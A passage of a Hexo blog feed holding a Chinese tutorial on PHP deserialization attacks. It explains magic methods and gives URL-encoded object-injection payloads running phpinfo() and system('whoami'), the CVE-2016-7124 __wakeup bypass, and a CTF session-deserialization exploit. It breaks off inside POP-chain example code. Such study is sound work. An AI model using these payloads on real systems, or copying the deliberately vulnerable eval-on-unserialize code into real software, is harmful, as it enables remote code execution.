<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-04-29T02:20:44.426Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>php反序列化到pop链构造</title>
    <link href="http://yoursite.com/2020/04/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0pop%E9%93%BE%E6%9E%84%E9%80%A0/"/>
    <id>http://yoursite.com/2020/04/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0pop%E9%93%BE%E6%9E%84%E9%80%A0/</id>
    <published>2020-04-25T16:00:00.000Z</published>
    <updated>2020-04-29T02:20:44.426Z</updated>
    
    <content type="html"><![CDATA[<h4 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a><strong>序列化与反序列化</strong></h4><p>在php中，使用serialize和unserialize两个函数表示序列化与反序列化。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">serialize：把一个对象转化成字节流的字符串，序列化的对象会保存类的属性，不会保存方法</span><br><span class="line">unserialize：把字节流字符串转化成一个对象</span><br></pre></td></tr></table></figure><p>看下下面的列子，通过serialize序列化返回字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    &#x2F;&#x2F; 属性</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line">    public function __construct($name,$age)&#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; $age;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 方法</span><br><span class="line">    public function Skill()&#123;</span><br><span class="line">        echo &quot;My name is &quot;.$this-&gt;name.&quot;,I am is &quot;.$this-&gt;age.&quot; years old!&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new A(&#39;fanxing&#39;,&#39;20&#39;);</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>返回字节流的字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:7:&quot;fanxing&quot;;s:3:&quot;age&quot;;s:2:&quot;20&quot;;&#125;</span><br></pre></td></tr></table></figure><p>O代表对象:长度:类的名字:类的属性个数:{类型:长度:属性名字;类型:长度:属性值;…}</p><p>反序列化列子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    &#x2F;&#x2F; 属性</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line">    public function __construct($name,$age)&#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; $age;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; 方法</span><br><span class="line">    public function Skill()&#123;</span><br><span class="line">        echo &quot;My name is &quot;.$this-&gt;name.&quot;,I am is &quot;.$this-&gt;age.&quot; years old!&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; unserialize(&#39;O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:7:&quot;fanxing&quot;;s:3:&quot;age&quot;;s:2:&quot;20&quot;;&#125;&#39;);</span><br><span class="line">$a-&gt;Skill();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>打印出Skill方法中的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My name is fanxing,I am is 20 years old!</span><br></pre></td></tr></table></figure><h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a><strong>魔术方法</strong></h4><p>在学习php反序列漏洞前，都需要先了解php的魔术方法，常见的魔术方法如下：</p><p><strong>__construct()</strong>    </p><p>当一个对象被创建的时候调用该方法。</p><p><strong>__destruct()</strong></p><p>当一个对象被删除和销毁的时候调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        echo &quot;对象创建调用.&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo &quot;对象销毁调用&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new A();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>__toString</strong></p><p>当一个对象被当成字符串的时候进行调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        echo &quot;对象创建调用.&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        echo &quot;对象字符串调用&quot;;</span><br><span class="line">        return &quot;1&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new A();</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>__invoke</strong></p><p>当一个对象以函数的方式进行调用的时候会被调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        echo &quot;对象创建调用.&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        echo &quot;对象以函数调用&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new A();</span><br><span class="line">$a();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>__sleep</strong></p><p>对象在使用serialize函数前会先调用，在执行序列化的操作。</p><p><strong>__wakeup</strong></p><p>对象在使用unserialize函数前会先调用，在执行反序列化的操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        echo &quot;对象创建调用&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __sleep()&#123;</span><br><span class="line">        echo &quot;序列化被调用&lt;br&gt;&quot;;</span><br><span class="line">        return array();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo &quot;反序列化被调用&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new A();</span><br><span class="line">$s &#x3D; serialize($a);</span><br><span class="line">echo unserialize($s);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>__call</strong></p><p>对象在调用不可访问的方法的时候触发</p><p><strong>__callStatic</strong></p><p>在静态中调用不可访问的方法的时候会触发</p><p><strong>__set</strong></p><p>给不可以访问的属性赋值被调用</p><p><strong>__get</strong></p><p>读取不可访问的属性值被调用</p><p><strong>__isset</strong></p><p>不可访问的属性调用为 isset() 或 empty()时被调用</p><p><strong>__unset</strong></p><p>对不可以访问的属性使用unset会被调用</p><h4 id="对象注入"><a href="#对象注入" class="headerlink" title="对象注入"></a><strong>对象注入</strong></h4><p>满足unserialize参数可控和类中存在魔法方法，并且存在危险函数既进行对象注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    private $name;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        echo &quot;对象创建调用&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        eval($this-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; unserialize($_GET[&#39;a&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里我们打印下序列化结果，发现属性的长度是7。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;A&quot;:1:&#123;s:7:&quot;Aname&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p>这里需要注意的是成员属性使用的是private属性，在使用private和protected属性时，会在类名前后添加%00，即2个字符，使用urlencode打印出来看看。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A1%3A%22A%22%3A1%3A%7Bs%3A7%3A%22%00A%00name%22%3BN%3B%7D</span><br></pre></td></tr></table></figure><p>同样，也可以加属性名前面添加\00*\00，构造下pyalod直接执行了任意代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A1%3A&quot;A&quot;%3A1%3A%7Bs%3A7%3A&quot;%00A%00name&quot;%3Bs%3A10%3A&quot;phpinfo%28)%3B&quot;%3B%7D</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/1.png" alt="" loading="lazy"></p><p>在举一个列子，这里使用__wakeup魔法方法来来绕过，涉及到一个CVE-2016-7124漏洞，该漏洞影响版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP5 &lt; 5.6.25</span><br><span class="line">PHP7 &lt; 7.0.10</span><br></pre></td></tr></table></figure><p>举个列子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    private $name&#x3D;&#39;phpinfo();&#39;;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        $this-&gt;name &#x3D; &#39;phpinfo();&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        eval($this-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; unserialize($_GET[&#39;a&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>__wakeup会在反序列化之前执行，所以怎么样对象被销毁的时候都是要执行phpinfo的，那怎么绕过</p><p>__wakeup呢？需要构造如下序列化对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A1%3A&quot;A&quot;%3A2%3A%7Bs%3A7%3A&quot;%00A%00name&quot;%3Bs%3A17%3A&quot;system%28&quot;whoami&quot;%29%3B&quot;%3B%7D</span><br></pre></td></tr></table></figure><p>这里对象的属性个数是1，我设置为大于1就绕过了__wakeup，所以当序列化的结果的对象属性大于本身类的对象属性就可以绕过wakeup魔术方法。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/2.png" alt="2" loading="lazy"></p><h4 id="Session反序列化"><a href="#Session反序列化" class="headerlink" title="Session反序列化"></a><strong>Session反序列化</strong></h4><p>php的session在存储和读取的时候，会进行序列化和反序列化，在php中有3种序列化的方式，当在php.ini中设置如下值：</p><table><thead><tr><th>session.serialize_handler</th><th>存储方式</th></tr></thead><tbody><tr><td>php</td><td>键名+竖线+经过serialize序列化的字符串</td></tr><tr><td>php_serialize</td><td>serialize序列化的的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符＋键名＋经过serialize()函数反序列处理的值</td></tr></tbody></table><p>举个列子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#39;name&#39;] &#x3D; &#39;fanxing&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>当session.serialize_handler为php的时候，存储的session结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name|s:7:&quot;fanxing&quot;;</span><br></pre></td></tr></table></figure><p>当session.serialize_handler为php_serialize的时候，存储的session结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:4:&quot;name&quot;;s:7:&quot;fanxing&quot;;&#125;</span><br></pre></td></tr></table></figure><p>当session.serialize_handler为php_binary的时候，存储的session结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">二进制字符串names:7:&quot;fanxing&quot;</span><br></pre></td></tr></table></figure><p>php大于5.5.4的版本默认使用的是php_serialize。</p><p>在php.ini中，还要了解一些关于session的配置：</p><p>session.save_path    session保存的路径</p><p>session.upload_progress.cleanup    上传完成后(POST)会立即删除进度，默认开启</p><p>session.upload_progress.enabled    将上传的进度存于session，默认开启</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。</span><br><span class="line"></span><br><span class="line">当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。</span><br></pre></td></tr></table></figure><p>这里利用CTF的一道题目：<a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/index.php</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;A webshell is wait for you</span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mdzz &#x3D; &#39;phpinfo();&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#39;phpinfo&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">    $m &#x3D; new OowoO();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(&#39;sessiontest.php&#39;));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看到题目使用的是php5.6.21，默认使用的是php_serialize，而题目使用的是php，所以可以利用session.upload_progress.enabled来构造session。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;web.jarvisoj.com:32784&#x2F;index.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;&lt;?php echo ini_get(&quot;session.upload_progress.name&quot;); ?&gt;&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz&#x3D;&#39;print_r(dirname(__FILE__));&#39;;</span><br><span class="line">&#125;</span><br><span class="line">$b &#x3D; new OowoO();</span><br><span class="line">$a &#x3D; serialize($b);</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在filename处提交payload：|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:27:&quot;print_r(dirname(<strong>FILE</strong>));&quot;;}</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/3.png" alt="3" loading="lazy"></p><p>之后就可以构造payload读取本地的文件，具体可以参考<a href="https://xz.aliyun.com/t/3674#toc-9" target="_blank" rel="noopener">先知twosmi1e师傅</a>和博客<a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%B8%80" target="_blank" rel="noopener">Mochazz师傅的文章</a>。</p><h4 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a><strong>POP链构造</strong></h4><p>在反序列化攻击中，一般都要寻找魔术方法中的一些敏感函数来触发漏洞，当魔法方法中不存在敏感函数时，需要构造pop链寻找相同函数将类的属性和敏感函数联系到一起。</p><p>这里，参考了这位<a href="http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">师傅</a>的题目，题目部分代码我删了下，看原题可以去连接看这位师傅的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class OutputFilter &#123;</span><br><span class="line">    protected $matchPattern;</span><br><span class="line">    protected $replacement;</span><br><span class="line">    function __construct($pattern, $repl) &#123;</span><br><span class="line">        $this-&gt;matchPattern &#x3D; $pattern;</span><br><span class="line">        $this-&gt;replacement &#x3D; $repl;</span><br><span class="line">    &#125;</span><br><span class="line">    function filter($data) &#123;</span><br><span class="line">        return preg_replace($this-&gt;matchPattern, $this-&gt;replacement, $data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">class LogFileFormat &#123;</span><br><span class="line">    protected $filters;</span><br><span class="line">    protected $endl;</span><br><span class="line">    function __construct($filters, $endl) &#123;</span><br><span class="line">        $this-&gt;filters &#x3D; $filters;</span><br><span class="line">        $this-&gt;endl &#x3D; $endl;</span><br><span class="line">    &#125;</span><br><span class="line">    function format($txt) &#123;</span><br><span class="line">        foreach ($this-&gt;filters as $filter) &#123;</span><br><span class="line">            $txt &#x3D; $filter-&gt;filter($txt);</span><br><span class="line">        &#125;</span><br><span class="line">        $txt &#x3D; str_replace(&#39;\n&#39;, $this-&gt;endl, $txt);</span><br><span class="line">        return $txt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">class LogWriter_File &#123;</span><br><span class="line">    protected $filename;</span><br><span class="line">    protected $format;</span><br><span class="line">    function __construct($filename, $format) &#123;</span><br><span class="line">        $this-&gt;filename &#x3D; str_replace(&quot;..&quot;, &quot;__&quot;, str_replace(&quot;&#x2F;&quot;, &quot;_&quot;, $filename));</span><br><span class="line">        $this-&gt;format &#x3D; $format;</span><br><span class="line">    &#125;</span><br><span class="line">    function writeLog($txt) &#123;</span><br><span class="line">        $txt &#x3D; $this-&gt;format-&gt;format($txt);</span><br><span class="line">        &#x2F;&#x2F;TODO: Modify the address here, and delete this TODO.</span><br><span class="line">        file_put_contents(&quot;D:\\phpStudy\\WWW\\ctf&quot; . $this-&gt;filename, $txt, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">class Logger &#123;</span><br><span class="line">    protected $logwriter;&#x2F;&#x2F;这里装入LogWriter_File对象</span><br><span class="line">    function __construct($writer) &#123;</span><br><span class="line">        $this-&gt;logwriter &#x3D; $writer;</span><br><span class="line">    &#125;</span><br><span class="line">    function log($txt) &#123;&#x2F;&#x2F;这里偷梁换柱Song的log</span><br><span class="line">        $this-&gt;logwriter-&gt;writeLog($txt);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">class Song &#123;</span><br><span class="line">    protected $logger;</span><br><span class="line">    protected $name;</span><br><span class="line">    protected $group;</span><br><span class="line">    protected $url;</span><br><span class="line">    function __construct($name, $group, $url) &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;group &#x3D; $group;</span><br><span class="line">        $this-&gt;url &#x3D; $url;</span><br><span class="line">        $fltr &#x3D; new OutputFilter(&quot;&#x2F;\[i\](.*)\[\&#x2F;i\]&#x2F;i&quot;, &quot;&lt;i&gt;\\1&lt;&#x2F;i&gt;&quot;);</span><br><span class="line">        $this-&gt;logger &#x3D; new Logger(new LogWriter_File(&quot;song_views&quot;, new LogFileFormat(array($fltr), &quot;\n&quot;)));</span><br><span class="line">    &#125;</span><br><span class="line">    function __toString() &#123;</span><br><span class="line">        return &quot;&lt;a href&#x3D;&#39;&quot; . $this-&gt;url . &quot;&#39;&gt;&lt;i&gt;&quot; . $this-&gt;name . &quot;&lt;&#x2F;i&gt;&lt;&#x2F;a&gt; by &quot; . $this-&gt;group;</span><br><span class="line">    &#125;</span><br><span class="line">    function log() &#123;</span><br><span class="line">        $this-&gt;logger-&gt;log(&quot;Song &quot; . $this-&gt;name . &quot; by [i]&quot; . $this-&gt;group . &quot;[&#x2F;i] viewed.\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    function get_name() &#123;</span><br><span class="line">        return $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Lyrics &#123;</span><br><span class="line">    protected $lyrics;</span><br><span class="line">    protected $song;</span><br><span class="line">    function __construct($lyrics, $song) &#123;</span><br><span class="line">        $this-&gt;song &#x3D; $song;</span><br><span class="line">        $this-&gt;lyrics &#x3D; $lyrics;</span><br><span class="line">    &#125;</span><br><span class="line">    function __toString() &#123;</span><br><span class="line">        return &quot;&lt;p&gt;&quot; . $this-&gt;song-&gt;__toString() . &quot;&lt;&#x2F;p&gt;&lt;p&gt;&quot; . str_replace(&quot;\n&quot;, &quot;&lt;br &#x2F;&gt;&quot;, $this-&gt;lyrics) . &quot;&lt;&#x2F;p&gt;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        $this-&gt;song-&gt;log();</span><br><span class="line">    &#125;</span><br><span class="line">    function shortForm() &#123;</span><br><span class="line">        return &quot;&lt;p&gt;&lt;a href&#x3D;&#39;song.php?name&#x3D;&quot; . urlencode($this-&gt;song-&gt;get_name()) . &quot;&#39;&gt;&quot; . $this-&gt;song-&gt;get_name() . &quot;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function name_is($name) &#123;</span><br><span class="line">        return $this-&gt;song-&gt;get_name() &#x3D;&#x3D;&#x3D; $name;</span><br><span class="line">    &#125;</span><br><span 